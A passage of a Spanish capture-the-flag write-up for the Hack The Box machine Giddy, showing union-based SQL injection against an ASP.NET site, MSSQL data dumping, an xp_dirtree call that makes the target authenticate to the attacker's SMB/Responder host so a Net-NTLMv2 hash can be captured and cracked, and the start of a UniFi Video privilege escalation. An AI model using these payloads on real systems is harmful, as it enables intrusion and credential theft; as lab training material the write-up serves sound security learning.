Si nos fijamos ya sea con la extensión `Wappalyzer` de Firefox o con la herramienta `whatweb` vemos algo de `asp.net`:

```bash
❱ whatweb https://10.10.10.104/remote
https://10.10.10.104/remote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/default.aspx?ReturnUrl=%2fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]

https://10.10.10.104/Remote/default.aspx?ReturnUrl=%2fremote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/en-US/logon.aspx?ReturnUrl=%252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]

https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%252fremote [302 Found] ASP_NET[4.0.30319], Cookies[.redirect.], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.redirect.], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%25252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
```

Contamos con la versión `4.0.30319` de `asp.net`, buscando cositas en la web con esto tampoco llegamos a nada interesante o relevante :( 

...

Veamos la ruta `/mvc` de la web:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ufff, muchos recursos (si nos fijamos a la derecha del todo aún quedan varios scrolls hacia abajo y todo son links), notamos varias cositas:

* Un botón de **registro**: `http://10.10.10.104/mvc/Account/Register.aspx`.
* Un botón de **login**: `http://10.10.10.104/mvc/Account/Login.aspx`.
* 4 botones más, los 4 funcionales: 
  * `http://10.10.10.104/mvc/About.aspx`.
  * `http://10.10.10.104/mvc/Contact.aspx`.
  * `http://10.10.10.104/mvc/Search.aspx`.
* Los links que hacen referencia a nombres de productos tienen este formato:
  * `http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=12`, donde **12** puede ser cualquier número (o sea, cualquier producto).

Vaya, varias cositas para probar (eso de los productos tiene una cara de **SQLi** que ufff), pero vamos por orden.

Si nos creamos una cuenta, nos inicia sesión de una. Curiosamente no hay nada distinto a lo que vimos ya.

Jugando con el apartado `Search.aspx` tenemos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si insertamos algo como `<h1>Hola</h1>`, para saber si podemos inyectar código HTML nos responde esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search_errorHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos devuelve un error, pero además de eso vemos varias cositas, como una ruta absoluta y algunas versiones que están siendo usadas con el servicio. Probando algo más interesante como inyectar consultas **SQL** no logramos nada, usamos estos dos payloads como base, de ellos vamos probando variaciones:

| Payload            | Descripción |
| ------------------ | :---------- |
| `1 order by 100`   | Así intentamos determinar cuantas columnas hay en la consulta actual, como ejemplo intentamos **100** columnas, si no existe ese número de columnas nos debería responder con un error, si vemos ese error, sabemos que es vulnerable y debemos empezar a jugar con el **100** hacia abajo para encontrar el número de columnas (cuando ya no nos arroje error sabremos que ese será el número de columnas). |
| `1 or sleep(5)`    | Para ver si existe una vulnerabilidad **SQL** basada en tiempo (si la consulta se demora 5 segundos en responder, sabríamos que es vulnerable). |
| `;#`               | Hace referencia a un comentario (hay varias maneras), por lo que le decimos que tome toooooooodo lo que este después de nuestro payload como comentario para que no interfiera con nuestra explotación |

Pero lo dicho, jugando con `Search.aspx` con algunos payloads no llegamos a ningún lado, así que movámonos a los productos.

Seleccionamos cualquiera, por ejemplo el **33** que hace referencia a las *luces*:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_light.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, si jugamos con las columnas, encontramos algooooooooooooooooooooooo:

```html
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 100;#
```

> 33, 1, 2 o 234, da igual el numero.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opaaaaaaa, confirmamos **inyección SQL** (: vemos el error que nos indica que **100** está fuera de rango del número de columnas, así que debemos empezar a bajar el número y ver en que momento dejamos de ver el error.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

También vemos las versiones de antes, pero ahora hay una nueva ruta, y esta parecer ser donde residen todos los archivos del servicio web (: sigamos con la **SQLi**...

> Y un nuevo usuario, `jnogueira`, guardemoslo.

...

## Jugamos con la <u>inyección SQL</u> [#](#explotacion) {#explotacion}

---

### Encontramos número de columnas usando <u>ORDER BY</u> [🔗](#mvc-sqli-orderby) {#mvc-sqli-orderby}

Moviendo números encontramos el límite:

```html
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 26;#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order26.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

```html
http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 25;#
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order25.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, 25 columnas, ahora tenemos que jugar con todas y ver en cuál de ellas logramos almacenar valores.

### Descubrimos en cuáles podemos almacenar texto [🔗](#mvc-sqli-union-hola) {#mvc-sqli-union-hola}

---

* [Acá una guía de lo que debemos hacer - SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks).

Bien, pues creémonos un script superrápido que nos haga las 25 iteraciones (25 columnas) cambiando el valor de cada una por algún texto, si la respuesta del servidor no nos devuelve errores y por el contrario nos devuelve el texto, tendríamos una columna para jugar:

> [search_column_union.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/search_column_union.py)

---

```py
❱ python3 search_column_union.py 

[+] Payload: 33 UNION SELECT NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '2' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '3' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '6' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '11' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '12' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '13' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '16' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '17' de nuestro payload nos permite escribir en la web

[+] Payload: 33 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'HOLAAAAAAACOMOESTAAAAS',NULL,NULL,NULL,NULL,NULL,NULL,NULL;-- -
[+] La columna '18' de nuestro payload nos permite escribir en la web
```

Perfectisimo, ya vemos varios campos, podemos jugar con cualquiera, tomaré la columna número `2` (:

Antes de ponernos a dumpear las bases de datos debemos saber contra qué servicio **SQL** estamos enfrentándonos (algunos ya lo sabrán por los errores), para esto juguemos con la variable `@@version` y veamos:

### Vemos la <u>versión</u> del servicio <u>SQL</u> [🔗](#mvc-sqli-version) {#mvc-sqli-version}

Ya podemos quitarnos el bucle e indicarle donde queremos que juegue, entonces empecemos a generar nuestro script para extraer toda la data, pero lo dicho, primero veamos la versión y así saber con qué sintaxis tenemos que seguir la explotación:

```sql
33 UNION SELECT campos_null,ELcampoQUEqueremosVERdeLAdb,los_otros_23_campos_null,..,..,..;-- -
```

Entonces como respuesta, en la web veríamos `ELcampoQUEqueremosVERdeLAdb`:

> [extract_data_sqli_errorbased.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44)

Si lo ejecutamos vemos:

```bash
❱ python3 extract_data_sqli.py -f '@@version'
[+] Extrayendo la variable @@version del servicio SQL.
[+] @@version: 
    Microsoft SQL Server 2016 (SP1) (KB3182545) - 13.0.4001.0 (X64) 
        Oct 28 2016 18:17:30 
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2016 Standard 6.3 <X64> (Build 14393: ) (Hypervisor)
```

Opa, estamos ante el servicio de bases de datos [Microsoft SQL Server](https://searchdatacenter.techtarget.com/es/definicion/SQL-Server), pues ahora sabemos que no podemos usar las mismas **sentencias** que usamos con `MySQL`; es mi primer approach contra este servicio y su explotación, así que vamos a darle duro y aprendemos juntos.

Investigando encontramos varios recursos, podemos destacar 2:

* [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet).
* [MSSQL Practical Injection Cheat Sheet](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/).
* [Step By Step MSSQL Union Based Injection](http://www.securityidiots.com/Web-Pentest/SQL-Injection/MSSQL/MSSQL-Union-Based-Injection.html).

Vemos algunas variables para probar, intentemos ver el usuario que la base de datos actual:

```bash
❱ python3 extract_data_sqli.py -f 'user_name()'
[+] Extrayendo la variable user_name() del servicio SQL.
[+] user_name(): Giddy\stacy
```

```bash
❱ python3 extract_data_sqli.py -f 'user'
[+] Extrayendo la variable user del servicio SQL.
[+] user: Giddy\stacy
```

```bash
❱ python3 extract_data_sqli.py -f 'system_user'
[+] Extrayendo la variable system_user del servicio SQL.
[+] system_user: giddy\stacy
```

Listones, tenemos al usuario `stacy` para guardarlo en nuestros pensamientos, ahora sí, empecemos a explotar estooooooooooooooooooo!!

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_letsgoseinfeld.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

### Extraemos las <u>bases de datos</u> actuales del servicio <u>MSSQL</u> [🔗](#mvc-sqli-dbs) {#mvc-sqli-dbs}

Con ayuda [del primer recurso](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) referenciado antes, vemos una manera de extraer todas las bases de datos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_monkey_mssql_dbs.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Juguemos con la última línea, armemos un bucle por ejemplo de **10** bases de datos y veamos que surge:

(Es prácticamente igual a nuestra inyección por campos, solo que en esta generamos un bucle para que vaya iterando entre las N bases de datos que existan)

```sql
33 UNION SELECT campos_null,DB_NAME(N),los_otros_23_campos_null,..,..,.. ORDER BY 1;-- -
```

Le indicamos el [ORDER BY 1](https://stackoverflow.com/questions/3445118/what-is-the-purpose-of-order-by-1-in-sql-select-statement) para que lo que nos devuelva lo posicione en la primera columna (así nos es más fácil jugar con el script).

> [extract_data_sqli_errorbased.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44)

Ejecutamos yyyyyy:

```bash
❱ python3 extract_data_sqli.py
[+] Extrayendo las bases de datos del servicio MSSQL.

[+] Base de datos [0]: Injection
[+] Base de datos [1]: master
[+] Base de datos [2]: tempdb
[+] Base de datos [3]: model
[+] Base de datos [4]: msdb
```

Bien, 5 bases de datos, juguemos inicialmente con `Injection` (que tiene un nombre moooooooooooooy llamativo) a ver que tablas tiene:

### Extraemos las <u>tablas</u> de la base de datos <u>Injection</u> [🔗](#mvc-sqli-tables) {#mvc-sqli-tables}

Acá ya empezamos a limitar los resultados a **1** por fila, así lo único que debemos hacer es cambiar la fila en la que estamos pero siempre recibiendo un resultado.

> Sé que se pudo haber hecho que una sola consulta arrojara tooodo y de ese toooodo extraer las cositas, pero me parecio más sencillo de implementar uno por uno.

```sql
33 UNION SELECT CAMPOS_NULL,table_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.tables ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
```

Donde nos extraerá el nombre de las tablas que hay en la DB `nombreDB`, esto obtenido de la consulta `information_schema.tables` PEEEEEEERO en vez de `LIMIT` (como `MySQL`) usamos `OFFSET` y `FETCH` para limitar los resultados. 

Lo que hacemos es decirle:

> "HEEEEY, limitame los resultados a solo uno (`FETCH FIRST 1 ROWS ONLY`) y ve cambiando la fila en la que te encuentras por favor (`OFFSET N` (donde N va de **0** a **1** a **2** y **al numero que sea**))"

* Tomado de [How to Limit Rows in a SQL Server Result Set](https://learnsql.com/cookbook/how-to-limit-rows-in-a-sql-server-result-set/).

> [extract_data_sqli_errorbased.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44)

```bash
❱ python3 extract_data_sqli.py --dump Injection

[+] Dumpeando tablas de la base de datos 'Injection': ✔
+----------------------+
| Tablas DB: Injection |
+----------------------+
| CreditCard           |
| Product              |
| ProductCategory      |
| ProductSubcategory   |
+----------------------+
```

Jmmm, 4 no más, veamos la tabla `CreditCard` a ver que columnas tiene:

### Extraemos las <u>columnas</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> [🔗](#mvc-sqli-columns) {#mvc-sqli-columns}

Exactamente igual, solo que agregamos contra que tabla queremos trabajar:

```sql
33 UNION SELECT CAMPOS_NULL,column_name,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB].information_schema.columns WHERE table_name='nombreTABLA' ORDER BY 1 OFFSET N ROWS FETCH FIRST 1 ROWS ONLY;-- -
```

Lo único que cambia es que extraemos las columnas de la DB `nombreDB` peeero que estén relacionadas con la tabla `nombreTABLA`, nada más.

> [extract_data_sqli_errorbased.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44)

```bash
❱ python3 extract_data_sqli.py --dump Injection CreditCard
[+] Dumpeando columnas de la tabla 'CreditCard' en la base de datos 'Injection': ✔

+--------------+
| Columnas     |
+--------------+
| CardNumber   |
| CardType     |
| CreditCardID |
| ExpMonth     |
| ExpYear      |
| ModifiedDate |
+--------------+
```

Ninguna columna es llamativa, jmmm, sin embargo intentemos ver algún valor, por ejemplo el de `CardType`:

### Vemos la data de la columna <u>CardType</u> en la tabla <u>CreditCard</u> de la base de datos <u>Injection</u> [🔗](#mvc-sqli-data) {#mvc-sqli-data}

Y la más sencilla, solo le indicamos de donde queremos extraer QUÉ data.

```sql
33 UNION SELECT CAMPOS_NULL,nombreCAMPO,LOS_OTROS_23_CAMPOS_NULL,..,..,.. FROM [nombreDB]..nombreTABLA ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -
```

Sencillito, le decimos: "extrae el campo `nombreCAMPO` de la tabla `nombreTABLA` que está en la DB `nombreDB`, muchas gracias".

> [extract_data_sqli_errorbased.py](https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli_errorbased.py#L44)

```bash
❱ python3 extract_data_sqli.py --dump Injection CreditCard CardType
[+] Extrayendo valores de la columna 'CardType' en Injection.CreditCard: ✔

+---------------+
| CardType      |
+---------------+
| ColonialVoice |
| Distinguish   |
| SuperiorCard  |
| Vista         |
+---------------+
```

Pos si, los tipos de tarjetas de crédito 😑

Ahora nos queda movernos entre las bases de datos, sus tablas y columnas a ver en cuáles encontramos algo útil...

...

### Jugando con comandos de <u>MSSQL</u> [🔗](#mvc-sqli-exec) {#mvc-sqli-exec}

Después de una ardua enumeración no encontramos nada de nada :(

> Al menos nos sacamos un lindo lindo script.

Buscando de que otras maneras podemos aprovecharnos de esta inyección, llegamos a esta gran lista de payloads para usar:

* [PayloadAllTheThings - MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md).

En él hay [algunas maneras de ejecutar comandos](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-command-execution) con la instrucción [xp_cmdshell](https://www.sqlshack.com/es/como-utilizar-el-procedimiento-extendido-xp_cmdshell/), pero probando cositas no obtenemos respuestas :(

### <span style="color: red;">✘</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> [🔗](#smclient-mvc-sqli-exec-xpdirtree) {#smclient-mvc-sqli-exec-xpdirtree}

Si seguimos bajando llegamos al apartado [MSSQL UNC Path](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-unc-path), el cual nos indica que **MSSQL** soporta el listado de archivos que existan en un directorio compartido a través de **SMB**, esto mediante la instrucción [xp_dirtree](https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html). 

Esto es interesante porque si logramos que el usuario de la base de datos (`Stacy`) haga la conexión contra nuestro folder compartido, llegara con ella un hash como método de autenticación, ese hash puede llegar a ser crackeable, pero claro, dependemos de cuan fuerte o no es la contraseña que hay por detrás.

* [Explicación concreta de los tipos de hashes: **LM**, **NTLM** y **Net-NTLMv2**](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

Bien, pues compartamos una carpeta, usemos [smbclient.py](https://neil-fox.github.io/Impacket-usage-&-detection/#smbclientpy):

```bash
❱ smbserver.py smbFolder $(pwd)
```

La carpeta compartida se llama `smbFolder` y toma la ruta actual en la que estemos (: ahora ejecutemos la instrucción a ver si llega alguna conexión:

```bash
❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5\smbFolder'"

[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5\smbFolder';-- -

[+] Listonessss.
```

Si revisamos nuestra carpeta vemos una conexióóóóóóóóóóóóón:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_smbclient_stacy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Sip, **Stacy** hace dos conexiones por lo tanto vemos dos hashes, si nos [guiamos del recurso anteriormente citado](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) sabemos que es un hash **Net-NTLMv2**, podemos jugar con `John The Ripper` e intentar crackearlo:

Lo guardamos en un archivo:

```bash
❱ cat stacy.hash 
Stacy::GIDDY:aaaaaaaa:7314d853e80f9b14ffd777487e0ded22:0101000000000000800c43548681d7018508a21f5f6d94bf00000000010010007a007800530076004200560076004300020010004a007800660055004800650073007900030010007a007800530076004200560076004300040010004a00780066005500480065007300790007000800800c43548681d70106000400020000000800300030000000000000000000000000300000483c10b9e519cd8ccad95791e38cd0e00f9987c059e89a051afd94f7f5f7fb820a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000
```

Y ahora con `john`:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
```

Pero la respuesta nos deja muertos:

> <span style="color: yellow;">No password hashes loaded (see FAQ)</span>

### <span style="color: green;">✔</span> Extraemos hash <u>Net-NTLMv2</u> del usuario <u>Stacy</u> [🔗](#responder-mvc-sqli-exec-xpdirtree) {#responder-mvc-sqli-exec-xpdirtree}

Jmm F, intentando e intentando cositas no logramos respuesta distinta a esa. Leyendo el post de los hashes hablan de una herramienta llamada [responder](https://github.com/lgandx/Responder), la cual (entre muuuchas cosas) también nos sirve como intermediario para cuando alguien intenta conectarse o interactuar con nuestro sistema. Intentemos con ella a ver si vemos algo distinto:

Al ser la primera vez que lo uso, debemos descargarlo:

1. Vamos al repo de la tool.
2. En nuestra terminal hacemos `git clone https://github.com/lgandx/Responder.git`.
3. Y ya tendríamos el programa `Responder.py`, lo renombraré a `responder.py` para que sea más sencillo el llamado (que pereza escribir la primera en mayus 😊)

En internet encontramos [este recurso](https://www.a2secure.com/en/blog/how-to-use-responder-to-capture-netntlm-and-grab-a-shell/) que nos muestra como usar `Responder` para capturar hashes `NetNTLM`.

Si queremos validar el tráfico de alguna interfaz, por ejemplo de la `tun0`, que seria donde esta **HTB**:

```bash
❱ ifconfig 
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ...
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        ...
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        ...
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.5  netmask 255.255.254.0  destination 10.10.14.5
        ...
```

Y ahora ejecutaríamos con el `responder` que analice el tráfico de esa interfaz:

```bash
❱ responder.py -I tun0 -A  
```

Nos desplegara algunas opciones activas o inactivas del programa y al final nos mostrara que esta en escucha por la interfaz `tun0`:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_tun0_A.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Ahora bien, para capturar el hash de `Stacy` (que es el user que hace la petición) debemos quitar el parámetro `-A`:

```bash
❱ responder.py -I tun0
```

Lo siguiente será enviar una petición desde el servicio **MSSQL** a nuestra **IP** servida en la interfaz `tun0`, o sea, a la `10.10.14.5` y ver que pasa en el **responder**:

```bash
❱ python3 extract_data_sqli.py --command "use master; exec xp_dirtree '\\\10.10.14.5'"

[+] Enviando: ...=33; use master; exec xp_dirtree '\\10.10.14.5';-- -

[+] Listonessss.
```

Yyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_responder_stacy_hash.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Bien, también obtenemos el hash `Net-NTLMv2` de **Stacy**, hagamos lo mismo de antes, lo tomamos, lo guardamos en un archivo y jugamos con `john`:

```bash
❱ john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 stacy.hash 
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_john_stacy_hash_cracked.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

PERFECTISIIIIIIIIIIIIIIIIIIMO, ahora sí logramos que tome el hash y mejor aún, que lo crackeeeeeeeeeeeeeeeeeeee.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_gif_football_letsgo.gif" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>

Que locura, lindo lindo...

Si recordamos en nuestro escaneo de `nmap`, el servicio `WinRM` por el puerto `5985` esta activo, entre las cosas que podemos hacer con él, ahí un recurso que lo aprovecha para generar una consola **PowerShell** llamado [evil-winrm](https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html), usémoslo y de una validemos si las credenciales son funcionales:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153bash_stacyPS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Listones ahora sí, estamos dentro del sistema como el usuario `Stacy` (:

...

Otra alternativa hubiera sido el usar la interfaz web que encontramos en nuestra enumeración web, la recuerdan? Había un recurso llamado `Remote`, si intentamos logearnos con esas credenciales, conseguimos una **PowerShell** en la web (que va un toque más rápida que la que tenemos con `evil-winrm`):

* [Con este recurso vemos un ejemplo de uso de la interfaz web](https://practical365.com/powershell-web-access-just-how-practical-is-it/).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginCREDS.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote_loginDONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Si una nos falla o algo así, ya tenemos un respaldo :P sigamos...

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

En el directorio en el que salimos cuando obtenemos nuestra **PowerShell** vemos un archivo con un nombre algo extraño:

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir

    Directory: C:\Users\Stacy\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2018   9:36 AM              6 unifivideo
...
```

Me dio curiosidad y busqué que era eso, la curiosidad nos dio vida:

> "unifi-video", tambien llamado "UniFi" es una solucion de video vigilancia, o sea, de camaras de seguridad.

Si le agregamos a nuestra búsqueda `"exploit"` vemos algo interesante:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153google_unifi_exploitDB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Lindo, un exploit que nos permite escalar privilegios, es más o menos viejito (concuerda con las fechas de la máquina) así que veámoslo a ver que nos comenta.

* [Ubiquiti UniFi Video 3.7.3 - Local Privilege Escalation](https://www.exploit-db.com/exploits/43390).

Tenemos varias cosas a destacar:

> Ubiquiti UniFi Video for Windows is installed to `C:\ProgramData\\unifi-video\` by default.

Validemos si efectivamente existe la ruta y tiene el contenido del programa:

```powershell
*Evil-WinRM* PS C:\Users\Stacy\Documents> dir C:\ProgramData\\unifi-video\

    Directory: C:\ProgramData\\unifi-video

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        6/16/2018   9:54 PM                bin
d-----        6/16/2018   9:55 PM                conf
d-----        6/16/2018  10:56 PM                data
d-----        6/16/2018   9:54 PM                email
d-----        6/16/2018   9:54 PM                fw
d-----        6/16/2018   9:54 PM                lib
d-----        7/26/2018  11:23 AM                logs
d-----        6/16/2018   9:55 PM                webapps
d-----        6/16/2018   9:55 PM                work
-a----        7/26/2017   6:10 PM         219136 avService.exe
-a----        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
-a----        6/17/2018  11:23 AM      534204321 hs_err_pid1992.mdmp
-a----        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
-a----        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
-a----        7/26/2017   6:10 PM          48640 UniFiVideo.exe
-a----        7/26/2017   6:10 PM          32038 UniFiVideo.ico
-a----        6/16/2018   9:54 PM          89050 Uninstall.exe
...
```

Perfecto, vamos bien :)

> Default permissions on the `C:\ProgramData\\unifi-video` folder are inherited from `C:\ProgramData` and are **not explicitly overridden**, which **allows all users**, even **unprivileged** ones, to **append and write files to the application directory**.

Validemos si es cierto que tenemos permisos de escritura con ayuda de `icacls`:

```powershell
*Evil-WinRM* PS C:\ProgramData> icacls unifi-video
unifi-video NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
            BUILTIN\Administrators:(I)(OI)(CI)(F)
            CREATOR OWNER:(I)(OI)(CI)(IO)(F)
            BUILTIN\Users:(I)(OI)(CI)(RX)
            BUILTIN\Users:(I)(CI)(WD,AD,WEA,WA)

Successfully processed 1 files; Failed processing 0 files
```

Pues si, como `BUILTIN\Users` tenemos varios permisos, pero los interesantes son:

* `WD`: "escribir datos/agregar archivo".
* `AD`: "anexar datos/agregar subdirectorio".

Les dejo una [lista](https://www.pantallazos.es/2018/03/windows-server-icacls-modificar-permisos-NTFS.html) de los permisos que encontramos y su significado.

Vamos aún mejor, veamos de que nos sirve saber esto:

> Upon **start** and **stop** of the service, it tries to **load and execute** the file at `C:\ProgramData\\unifi-video\taskkill.exe`. However this file does not exist in the application directory by default at all.

Y llega el remate:

